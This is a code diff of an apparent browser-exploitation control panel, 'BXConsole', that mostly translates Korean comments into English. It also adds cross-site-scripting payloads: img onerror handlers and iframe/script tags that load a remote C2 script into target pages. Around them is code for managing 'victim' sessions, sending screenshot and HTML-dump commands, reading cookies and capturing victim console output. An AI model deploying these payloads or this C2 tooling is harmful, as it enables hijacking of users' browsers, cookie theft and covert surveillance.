@@ -541,17 +541,17 @@ body{font:11px/1 'Menlo','Monaco','Consolas','Courier New',monospace;
 <!-- Probe panel -->
 <div id="pbpanel" class="panel">
   <div class="tbar" style="padding:0 10px;gap:8px">
-    <span style="color:var(--dim);font-size:10px">Probe hits — /bx.js · /probe 로드 기록 (Referer = 발생 페이지)</span>
+    <span style="color:var(--dim);font-size:10px">Probe hits — /bx.js · /probe load log (Referer = origin page)</span>
     <button class="mbtn" id="pbclear" style="margin-left:auto">Clear</button>
   </div>
   <div id="ptbl-wrap">
     <table id="ptbl">
       <thead><tr>
         <th style="width:60px">Time</th><th style="width:90px">Tag</th><th style="width:70px">Dest</th>
-        <th style="width:110px">IP</th><th>Referer (발생 페이지)</th><th>UA</th>
+        <th style="width:110px">IP</th><th>Referer (origin page)</th><th>UA</th>
       </tr></thead>
       <tbody id="ptbody">
-        <tr id="p-empty"><td colspan="6">No probe hits — Payloads 탭의 probe 페이로드를 대상 페이지에 넣어보세요</td></tr>
+        <tr id="p-empty"><td colspan="6">No probe hits — inject a probe payload from the Payloads tab</td></tr>
       </tbody>
     </table>
   </div>
@@ -674,7 +674,7 @@ $("ptabs").addEventListener("click", function(e){
   if (p==="pb") loadProbes();
 });
 
-/* ═══════════ Tab drag & reorder — localStorage 위치 고정 ═══════════ */
+/* ═══════════ Tab drag & reorder — position pinned to localStorage ═══════════ */
 var tabOrder = (localStorage.bx_tab_order || "").split(",").filter(Boolean);
 var dragEl = null;
 function applyTabOrder(){
@@ -968,7 +968,7 @@ function renderNet(){
     return true;
   });
   nbdg.textContent=rows.length; nbdg.className="bdg"+(rows.length?" show":"");
-  // dynamic method buttons — 실제 관측된 메소드 자동 노출 (WS◀/BEACON 등 포함)
+  // dynamic method buttons — auto-expose observed methods (incl. WS◀/BEACON)
   var meths=["GET","POST"];
   netRows.forEach(function(r){ var m=(r.method||"GET").toUpperCase(); if (meths.indexOf(m)<0) meths.push(m); });
   if (netMeth!=="ALL" && meths.indexOf(netMeth)<0) netMeth="ALL";
@@ -1023,7 +1023,7 @@ function renderNet(){
     renderNet();
   };
 }
-/* HAR 1.2 export — 캡처 데이터를 표준 포맷으로 다운로드 */
+/* HAR 1.2 export — download captured data in standard format */
 function exportHAR(){
   var iso=new Date().toISOString().slice(0,11);
   var har={log:{version:"1.2",creator:{name:"BXConsole",version:"0.3"},
@@ -1120,7 +1120,7 @@ function pollState(){
         if (!active||(!vics[active]&&!viewingClosed)) active=sorted[0];
         var tabList=sorted.slice();
         if (viewingClosed&&tabList.indexOf(active)<0) tabList.push(active);
-        // saved drag order — 사용자가 배치한 순서 우선, 신규 세션은 뒤에 추가
+        // saved drag order — user arrangement first, new sessions appended
         tabList.sort(function(a,b){
           var ia=sbarOrder.indexOf(a), ib=sbarOrder.indexOf(b);
           if (ia<0&&ib<0) return 0;
@@ -1226,11 +1226,11 @@ function pollState(){
       ccmd.disabled=false;
       ccmd.placeholder="document.cookie  ·  await bx.proxy('/api')  ·  bx.dom.text('h1')";
 
-      // console entries — 단일 시간순 스트림 (명령 → 결과 바로 아래 → 다음 명령)
+      // console entries — single chronological stream (cmd → result below → next cmd)
       var entries=[]; errCnt=0;
-      var groups=[];                                  // {t: 정렬 기준, rows: 표시 행들}
+      var groups=[];                                  // {t: sort key, rows: display rows}
 
-      // auto-collect — 피해자 최초 연결 시점에 배치
+      // auto-collect — placed at the victim's first-connect time
       var pi=(d.pageinfo||{})[active];
       if (pi){
         var prow=[], fv=d.victims[active]||{};
@@ -1250,7 +1250,7 @@ function pollState(){
         groups.push({t:fv.first||"", rows:prow});
       }
 
-      // commands — 슬래시 큰 뷰(썸네일/링크) 포함, 명령 바로 아래에 결과
+      // commands — incl. slash big views (thumbnail/link), result right below the cmd
       var srMap={};
       (slashResults[active]||[]).forEach(function(r){ if (r.cid) srMap[r.cid]=r; });
       (d.commands||[]).filter(function(c){ return c.vid===active; }).forEach(function(c){
@@ -1264,12 +1264,12 @@ function pollState(){
         }
         groups.push({t:c.t_done||c.t_queued||"", rows:crow});
       });
-      // cid 배정 전(전송 직후) 슬래시 결과 — 스트림 맨 아래
+      // slash results before cid assignment (just sent) — at the stream bottom
       (slashResults[active]||[]).forEach(function(r){
         if (!r.cid) groups.push({t:"99:99:99", rows:[{type:"slash",r:r,rawText:""}]});
       });
 
-      // victim console — 발생 시각에 맞춰 스트림에 삽입
+      // victim console — inserted into the stream by its timestamp
       ((d.console||{})[active]||[]).forEach(function(l){
         var t=l.level==="error"?"error":l.level==="warn"?"warn":l.level==="info"?"info":"log";
         if (t==="error") errCnt++;
@@ -1398,7 +1398,7 @@ var SLASH = {
       return fetch("/api/send",{method:"POST",body:JSON.stringify({id:vid,cmd:"bx.shot()"})});
     }).then(function(res){ return res.json(); }).then(function(m){
       if (m.ok===false){ r.status="error"; r.msg="Send failed: "+(m.error||""); }
-      else { r.cid = m.cid; }                          // 명령 히스토리 행과 매칭
+      else { r.cid = m.cid; }                          // match with the command history row
     }).catch(function(e){ r.status="error"; r.msg="Error: "+e; });
   },
   "/html": function() {
@@ -1415,7 +1415,7 @@ var SLASH = {
       return fetch("/api/send",{method:"POST",body:JSON.stringify({id:vid,cmd:"bx.htmldump()"})});
     }).then(function(res){ return res.json(); }).then(function(m){
       if (m.ok===false){ r.status="error"; r.msg="Send failed: "+(m.error||""); }
-      else { r.cid = m.cid; }                          // 명령 히스토리 행과 매칭
+      else { r.cid = m.cid; }                          // match with the command history row
     }).catch(function(e){ r.status="error"; r.msg="Error: "+e; });
   }
 };
@@ -1478,7 +1478,7 @@ function loadProbes(){
             +'<td class="url-td" title="'+esc(r.ua||"")+'">'+esc((r.ua||"").slice(0,42))+'</td>'
             +'</tr>';
         }).join("")
-      : '<tr id="p-empty"><td colspan="6">No probe hits — Payloads 탭의 probe 페이로드를 대상 페이지에 넣어보세요</td></tr>';
+      : '<tr id="p-empty"><td colspan="6">No probe hits — inject a probe payload from the Payloads tab</td></tr>';
   }).catch(function(){});
 }
 $("pbclear").addEventListener("click",function(){
@@ -1505,13 +1505,15 @@ function plParts(){
            B64:btoa(imp), FCC:fcc.join(","), UENC:encodeURIComponent(U) };
 }
 var PAYLOADS = [
-  {sec:"Probe · one-shot — 연결 확인 + 트리거를 한 번에", items:[
-    {n:"one-shot (img + script)", d:"probe hit(연결 확인) 후 곧바로 bx.js 로드", c:'<img src="{BASE}/probe?tag=hit"><script src="{C2}"><\/script>'},
-    {n:"one-shot (단일 태그)", d:"bx.js 요청 자체가 Probe 탭에 기록됨 (Referer=발생 페이지)", c:'<script src="{C2}?tag=hit"><\/script>'},
-    {n:"img probe", d:"JS 불필요 — img-src 허용 여부만 확인 (1x1 GIF 응답)", c:'<img src="{BASE}/probe?tag=img">'},
-    {n:"script probe", d:"script-src 허용 여부 확인 (세션 생성 없음)", c:'<script src="{BASE}/probe.js?tag=script"><\/script>'},
-    {n:"css probe", d:"style-src 허용 여부 확인", c:'<link rel="stylesheet" href="{BASE}/probe.css?tag=css">'},
-    {n:"fetch probe", d:"connect-src 확인 (콘솔 붙여넣기용, no-cors)", c:"fetch('{BASE}/probe?tag=fetch',{mode:'no-cors'})"},
+  {sec:"Probe · one-shot — connection check + trigger in one injection", items:[
+    {n:"one-shot · img", d:"probe hit via img, trigger via img onerror", c:'<img src="{BASE}/probe?tag=hit"><img src=x onerror="s=document.createElement(\'script\');s.src=\'{C2}\';document.body.appendChild(s)">'},
+    {n:"one-shot · script", d:"probe hit via img, trigger via classic script tag", c:'<img src="{BASE}/probe?tag=hit"><script src="{C2}"><\/script>'},
+    {n:"one-shot · style", d:"probe hit via stylesheet, trigger via img onerror", c:'<link rel="stylesheet" href="{BASE}/probe.css?tag=hit"><img src=x onerror="s=document.createElement(\'script\');s.src=\'{C2}\';document.body.appendChild(s)">'},
+    {n:"one-shot · iframe", d:"probe hit via hidden iframe, trigger via classic script tag", c:'<iframe src="{BASE}/probe?tag=hit" style="display:none"><\/iframe><script src="{C2}"><\/script>'},
+    {n:"img probe", d:"JS-free — checks img-src only (1x1 GIF response)", c:'<img src="{BASE}/probe?tag=img">'},
+    {n:"script probe", d:"checks script-src (no session created)", c:'<script src="{BASE}/probe.js?tag=script"><\/script>'},
+    {n:"css probe", d:"checks style-src", c:'<link rel="stylesheet" href="{BASE}/probe.css?tag=css">'},
+    {n:"fetch probe", d:"checks connect-src (console paste, no-cors)", c:"fetch('{BASE}/probe?tag=fetch',{mode:'no-cors'})"},
   ]},
   {sec:"Console trigger — paste into the victim DevTools console", items:[
     {n:"import (shortest)", d:"module import — bx.js is served with CORS *", c:"import('{C2}')"},
@@ -1845,7 +1847,7 @@ ccmd.addEventListener("input",function(){ showSug(this.value); });
 ccmd.addEventListener("blur",function(){ setTimeout(hideSug,150); });
 
 /* ═══════════ Send + autocomplete unified keydown ═══════════ */
-/* local queued echo — 즉시 피드백, 다음 poll에서 서버 상태(SENT/DONE+결과)가 인계받음 */
+/* local queued echo — instant feedback; next poll takes over (SENT/DONE + result) */
 function echoQueued(text){
   centries.innerHTML+='<div class="ce">'
     +'<span class="ico"><span class="ico-prompt">›</span></span>'
@@ -1878,14 +1880,14 @@ ccmd.addEventListener("keydown", function(e){
   if (e.key!=="Enter") return;
   hideSug();
   var c=this.value.trim(); if (!c) return;
-  // slash command — 일반 명령과 동일하게 큐에 들어가 실행되는 피드백
+  // slash command — queued and executed just like a normal command
   if (c.charAt(0)==="/") {
     this.value="";
     var fn=SLASH[c];
     if (!fn){ appendErr("Unknown command: "+esc(c)+" (available: /screenshot /html)"); return; }
     if (!active){ appendErr("No victim session — select a victim from the tab"); return; }
-    hist.push(c); hi=hist.length;                      // ↑ 재호출 통일
-    echoQueued(c);                                     // 즉시 [Queued] 피드백
+    hist.push(c); hi=hist.length;                      // ↑ unified recall
+    echoQueued(c);                                     // instant [Queued] feedback
     fn();
     return;
   }
